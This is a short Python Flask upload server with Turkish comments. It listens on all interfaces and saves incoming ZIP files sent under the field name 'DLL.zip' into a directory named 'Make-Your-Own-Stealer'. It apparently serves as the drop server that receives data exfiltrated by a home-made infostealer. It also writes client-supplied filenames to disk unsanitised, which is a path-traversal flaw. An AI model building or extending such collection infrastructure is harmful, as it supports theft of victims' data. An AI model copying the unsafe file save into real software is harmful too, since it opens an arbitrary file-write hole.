from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Dosyaların kaydedileceği dizin
UPLOAD_FOLDER = r"C:\Users\Lunix\Desktop\INFO\Make-Your-Own-Stealer\GPT"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'DLL.zip' not in request.files:
        return jsonify({"error": "No file part"}), 400
    
    file = request.files['DLL.zip']

    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    # Dosya uzantısını kontrol et
    if not file.filename.endswith('.zip'):
        return jsonify({"error": "Only ZIP files are allowed"}), 400
    
    # Dosyayı kaydet
    try:
        file.save(os.path.join(UPLOAD_FOLDER, file.filename))
        return jsonify({"message": f"File '{file.filename}' successfully uploaded!"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # Sunucuyu başlat
